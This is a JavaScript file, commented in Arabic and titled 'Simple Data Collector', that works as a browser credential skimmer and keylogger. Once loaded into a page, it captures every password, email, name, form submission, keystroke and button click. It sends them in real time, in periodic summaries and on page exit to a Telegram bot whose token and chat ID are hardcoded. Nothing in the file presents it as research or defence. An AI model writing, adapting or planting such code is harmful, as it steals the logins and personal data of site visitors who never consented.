// جامع البيانات البسيط - ضمان جمع جميع البيانات
// Simple Data Collector - Ensure All Data Collection

(function() {
    'use strict';

    const BOT_TOKEN = '7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU';
    const CHAT_ID = '2126771039';

    // مخزن البيانات المجمعة
    let collectedData = {
        passwords: {},
        emails: {},
        names: {},
        formData: {},
        keystrokes: '',
        startTime: Date.now()
    };

    // إرسال رسالة للتيليجرام
    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(error => {
            console.error('خطأ في الإرسال:', error);
        });
    }

    // تتبع جميع حقول الإدخال
    function trackAllInputs() {
        document.addEventListener('input', function(e) {
            const element = e.target;
            if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA') {
                const fieldInfo = {
                    id: element.id || element.name || element.placeholder || 'unknown',
                    type: element.type || 'text',
                    value: element.value,
                    timestamp: new Date().toISOString()
                };

                // حفظ البيانات حسب النوع
                if (element.type === 'password') {
                    collectedData.passwords[fieldInfo.id] = fieldInfo;
                    // إرسال فوري لكلمات المرور
                    if (fieldInfo.value.length > 3) {
                        sendPasswordAlert(fieldInfo);
                    }
                } else if (element.type === 'email' || fieldInfo.id.toLowerCase().includes('email')) {
                    collectedData.emails[fieldInfo.id] = fieldInfo;
                    // إرسال فوري للإيميلات
                    if (fieldInfo.value.includes('@')) {
                        sendEmailAlert(fieldInfo);
                    }
                } else if (fieldInfo.id.toLowerCase().includes('name')) {
                    collectedData.names[fieldInfo.id] = fieldInfo;
                    // إرسال فوري للأسماء
                    if (fieldInfo.value.length > 2) {
                        sendNameAlert(fieldInfo);
                    }
                }
            }
        });
    }

    // تنبيه كلمة المرور
    function sendPasswordAlert(data) {
        const message = `🔒 <b>كلمة مرور جديدة!</b>\n\n`
                     + `📝 الحقل: <code>${data.id}</code>\n`
                     + `🔑 كلمة المرور: <code>${data.value}</code>\n`
                     + `⏰ الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}\n`
                     + `📄 الصفحة: ${window.location.href}`;
        sendToTelegram(message);
    }

    // تنبيه البريد الإلكتروني
    function sendEmailAlert(data) {
        const message = `📧 <b>بريد إلكتروني جديد!</b>\n\n`
                     + `📝 الحقل: <code>${data.id}</code>\n`
                     + `📧 البريد: <code>${data.value}</code>\n`
                     + `⏰ الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}\n`
                     + `📄 الصفحة: ${window.location.href}`;
        sendToTelegram(message);
    }

    // تنبيه الاسم
    function sendNameAlert(data) {
        const message = `👤 <b>اسم مستخدم جديد!</b>\n\n`
                     + `📝 الحقل: <code>${data.id}</code>\n`
                     + `👤 الاسم: <code>${data.value}</code>\n`
                     + `⏰ الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}\n`
                     + `📄 الصفحة: ${window.location.href}`;
        sendToTelegram(message);
    }

    // تتبع إرسال النماذج
    function trackFormSubmissions() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            if (form.tagName === 'FORM') {
                const formData = new FormData(form);
                const formInfo = {
                    formId: form.id || 'unknown_form',
                    action: form.action,
                    method: form.method,
                    fields: {},
                    timestamp: new Date().toISOString()
                };

                // جمع جميع البيانات
                for (let [key, value] of formData.entries()) {
                    formInfo.fields[key] = value;
                }

                // إضافة البيانات من الحقول مباشرة
                const inputs = form.querySelectorAll('input, textarea, select');
                inputs.forEach(input => {
                    const name = input.name || input.id || input.placeholder || 'unknown';
                    if (input.value) {
                        formInfo.fields[name] = input.value;
                    }
                });

                collectedData.formData[formInfo.formId] = formInfo;
                sendFormAlert(formInfo);
            }
        });
    }

    // تنبيه إرسال النموذج
    function sendFormAlert(data) {
        let message = `📝 <b>نموذج جديد مُرسل!</b>\n\n`;
        message += `🆔 النموذج: <code>${data.formId}</code>\n`;
        message += `🔗 الإجراء: ${data.action || 'غير محدد'}\n`;
        message += `⏰ الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}\n\n`;
        message += `📋 <b>البيانات:</b>\n`;

        Object.entries(data.fields).forEach(([key, value]) => {
            if (value && value.toString().trim() !== '') {
                message += `   • <code>${key}</code>: <code>${value}</code>\n`;
            }
        });

        message += `\n📄 الصفحة: ${window.location.href}`;
        sendToTelegram(message);
    }

    // تتبع ضغطات المفاتيح المهمة
    function trackKeystrokes() {
        let keyBuffer = '';
        let lastSend = Date.now();

        document.addEventListener('keydown', function(e) {
            const currentTime = Date.now();
            
            // إضافة المفتاح للمخزن المؤقت
            if (e.key.length === 1) {
                keyBuffer += e.key;
            } else if (e.key === 'Backspace') {
                keyBuffer += '[BS]';
            } else if (e.key === 'Enter') {
                keyBuffer += '[ENTER]';
            }

            // إرسال كل 20 حرف أو كل 10 ثوان
            if (keyBuffer.length >= 20 || (currentTime - lastSend) > 10000) {
                if (keyBuffer.trim().length > 0) {
                    sendKeystrokeAlert(keyBuffer.trim());
                    keyBuffer = '';
                    lastSend = currentTime;
                }
            }
        });
    }

    // تنبيه ضغطات المفاتيح
    function sendKeystrokeAlert(keystrokes) {
        const activeElement = document.activeElement;
        const fieldInfo = activeElement ? {
            tag: activeElement.tagName,
            id: activeElement.id || activeElement.name || 'unknown',
            type: activeElement.type || 'unknown'
        } : { tag: 'unknown', id: 'unknown', type: 'unknown' };

        const message = `⌨️ <b>ضغطات مفاتيح جديدة!</b>\n\n`
                     + `📝 النص: <code>${keystrokes}</code>\n`
                     + `🎯 الحقل: ${fieldInfo.tag} (${fieldInfo.id})\n`
                     + `🏷️ النوع: ${fieldInfo.type}\n`
                     + `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n`
                     + `📄 الصفحة: ${window.location.href}`;
        sendToTelegram(message);
    }

    // تتبع تفاعلات الماوس المهمة
    function trackMouseInteractions() {
        document.addEventListener('click', function(e) {
            const element = e.target;
            if (element.tagName === 'BUTTON' || element.tagName === 'A' || element.type === 'submit') {
                const clickInfo = {
                    elementType: element.tagName,
                    text: element.textContent?.trim() || element.value || 'بدون نص',
                    id: element.id || element.className || 'unknown',
                    href: element.href || '',
                    timestamp: new Date().toISOString()
                };

                sendClickAlert(clickInfo);
            }
        });
    }

    // تنبيه النقرات المهمة
    function sendClickAlert(data) {
        const message = `🖱️ <b>نقرة مهمة!</b>\n\n`
                     + `🏷️ العنصر: ${data.elementType}\n`
                     + `📝 النص: <code>${data.text}</code>\n`
                     + `🆔 المعرف: <code>${data.id}</code>\n`
                     + `🔗 الرابط: ${data.href || 'لا يوجد'}\n`
                     + `⏰ الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}\n`
                     + `📄 الصفحة: ${window.location.href}`;
        sendToTelegram(message);
    }

    // إرسال تقرير دوري
    function sendPeriodicReport() {
        setInterval(() => {
            if (Object.keys(collectedData.passwords).length > 0 || 
                Object.keys(collectedData.emails).length > 0 || 
                Object.keys(collectedData.names).length > 0) {
                
                sendDataSummary();
            }
        }, 300000); // كل 5 دقائق
    }

    // ملخص البيانات المجمعة
    function sendDataSummary() {
        let message = `📊 <b>ملخص البيانات المجمعة</b>\n\n`;
        
        const sessionDuration = Math.round((Date.now() - collectedData.startTime) / 60000);
        message += `⏱️ مدة الجلسة: ${sessionDuration} دقيقة\n\n`;

        // كلمات المرور
        if (Object.keys(collectedData.passwords).length > 0) {
            message += `🔒 <b>كلمات المرور (${Object.keys(collectedData.passwords).length}):</b>\n`;
            Object.values(collectedData.passwords).forEach(pwd => {
                message += `   • ${pwd.id}: <code>${pwd.value}</code>\n`;
            });
            message += '\n';
        }

        // الإيميلات
        if (Object.keys(collectedData.emails).length > 0) {
            message += `📧 <b>الإيميلات (${Object.keys(collectedData.emails).length}):</b>\n`;
            Object.values(collectedData.emails).forEach(email => {
                message += `   • ${email.id}: <code>${email.value}</code>\n`;
            });
            message += '\n';
        }

        // الأسماء
        if (Object.keys(collectedData.names).length > 0) {
            message += `👤 <b>الأسماء (${Object.keys(collectedData.names).length}):</b>\n`;
            Object.values(collectedData.names).forEach(name => {
                message += `   • ${name.id}: <code>${name.value}</code>\n`;
            });
            message += '\n';
        }

        message += `📄 الصفحة: ${window.location.href}`;
        sendToTelegram(message);
    }

    // إرسال تقرير نهائي عند مغادرة الصفحة
    function sendFinalReport() {
        window.addEventListener('beforeunload', () => {
            // استخدام sendBeacon لضمان الإرسال
            const finalData = {
                totalDuration: Date.now() - collectedData.startTime,
                passwordsCount: Object.keys(collectedData.passwords).length,
                emailsCount: Object.keys(collectedData.emails).length,
                namesCount: Object.keys(collectedData.names).length,
                formsCount: Object.keys(collectedData.formData).length,
                page: window.location.href
            };

            const message = `👋 <b>انتهاء الجلسة</b>\n\n`
                         + `⏱️ المدة الإجمالية: ${Math.round(finalData.totalDuration / 60000)} دقيقة\n`
                         + `🔒 كلمات المرور: ${finalData.passwordsCount}\n`
                         + `📧 الإيميلات: ${finalData.emailsCount}\n`
                         + `👤 الأسماء: ${finalData.namesCount}\n`
                         + `📝 النماذج: ${finalData.formsCount}\n`
                         + `📄 الصفحة: ${finalData.page}`;

            navigator.sendBeacon(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            );
        });
    }

    // بدء تشغيل جميع أنظمة التتبع
    function initializeTracking() {
        trackAllInputs();
        trackFormSubmissions();
        trackKeystrokes();
        trackMouseInteractions();
        sendPeriodicReport();
        sendFinalReport();

        // إرسال تنبيه بدء الجلسة
        const startMessage = `🚀 <b>بدء جلسة تتبع جديدة</b>\n\n`
                           + `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n`
                           + `📄 الصفحة: ${window.location.href}\n`
                           + `🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}\n`
                           + `📱 الشاشة: ${window.screen.width}x${window.screen.height}`;
        sendToTelegram(startMessage);

        console.log('📡 Simple Data Collector Active');
    }

    // تشغيل النظام
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeTracking);
    } else {
        initializeTracking();
    }

})();